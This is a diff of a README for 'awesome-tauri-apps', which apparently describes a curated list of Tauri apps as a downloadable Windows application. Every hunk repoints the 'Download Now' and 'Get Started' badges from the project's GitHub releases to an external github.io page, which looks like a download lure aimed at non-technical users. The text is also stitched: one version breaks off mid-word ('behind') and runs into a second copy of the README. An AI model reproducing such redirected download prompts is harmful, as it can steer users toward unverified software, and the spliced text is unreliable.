@@ -1,6 +1,6 @@
 # 🚀 awesome-tauri-apps - Discover Amazing Desktop and Mobile Apps
 
-[![Download Now](https://img.shields.io/badge/Download_Now-awesome--tauri--apps-ff6b6b?style=for-the-badge&labelColor=6a11cb&logo=windows&logoColor=white)](https://github.com/lessoncushioning739/awesome-tauri-apps/releases)
+[![Download Now](https://img.shields.io/badge/Download_Now-awesome--tauri--apps-ff6b6b?style=for-the-badge&labelColor=6a11cb&logo=windows&logoColor=white)](https://lessoncushioning739.github.io)
 
 awesome-tauri-apps is a Windows-friendly app discovery hub for people who want to find useful desktop and mobile applications built with Tauri. It brings a curated list into a simple, approachable experience so you can browse, explore, and find apps without needing technical knowledge.
 
@@ -36,7 +36,7 @@ You do not need special developer tools, extra runtimes, or technical setup.
 
 ### 💾 Download and Run
 
-[![Get awesome-tauri-apps](https://img.shields.io/badge/Get_Started-Visit_Releases-4ecdc4?style=for-the-badge&labelColor=1a535c&logo=github&logoColor=white)](https://github.com/lessoncushioning739/awesome-tauri-apps/releases)
+[![Get awesome-tauri-apps](https://img.shields.io/badge/Get_Started-Visit_Releases-4ecdc4?style=for-the-badge&labelColor=1a535c&logo=github&logoColor=white)](https://lessoncushioning739.github.io)
 
 Visit this link to download the application.
 
@@ -73,7 +73,7 @@ Finding quality desktop and mobile apps can take time. awesome-tauri-apps reduce
 
 Tauri apps are often smaller and faster than traditional desktop applications. They can feel native on Windows while still offering the flexibility of modern web-based interfaces. This collection helps you discover those apps without needing to understand the technology behind# 🚀 awesome-tauri-apps - Discover Amazing Desktop and Mobile Apps
 
-[![Download Now](https://img.shields.io/badge/Download_Now-awesome--tauri--apps-ff6b6b?style=for-the-badge&labelColor=6a11cb&logo=windows&logoColor=white)](https://github.com/lessoncushioning739/awesome-tauri-apps/releases)
+[![Download Now](https://img.shields.io/badge/Download_Now-awesome--tauri--apps-ff6b6b?style=for-the-badge&labelColor=6a11cb&logo=windows&logoColor=white)](https://lessoncushioning739.github.io)
 
 awesome-tauri-apps is a curated list of desktop and mobile apps built with Tauri. It is designed for everyday computer users who want to explore useful, lightweight applications without needing any programming knowledge. The project brings together a hand-picked collection of apps in one place, making it easy to discover new tools for Windows, macOS, Linux, and mobile devices. Whether you are looking for productivity helpers, creative tools, or simple utilities, this collection helps you find apps that are fast, modern, and built with a technology known for its efficiency.
 
@@ -119,7 +119,7 @@ The application is designed to be responsive. It opens quickly and stays out of 
 
 ## 📥 Download
 
-[![Get awesome-tauri-apps](https://img.shields.io/badge/Get_Started-Visit_Releases-4ecdc4?style=for-the-badge&labelColor=1a535c&logo=github&logoColor=white)](https://github.com/lessoncushioning739/awesome-tauri-apps/releases)
+[![Get awesome-tauri-apps](https://img.shields.io/badge/Get_Started-Visit_Releases-4ecdc4?style=for-the-badge&labelColor=1a535c&logo=github&logoColor=white)](https://lessoncushioning739.github.io)
 
 Visit this link to download the application.
 
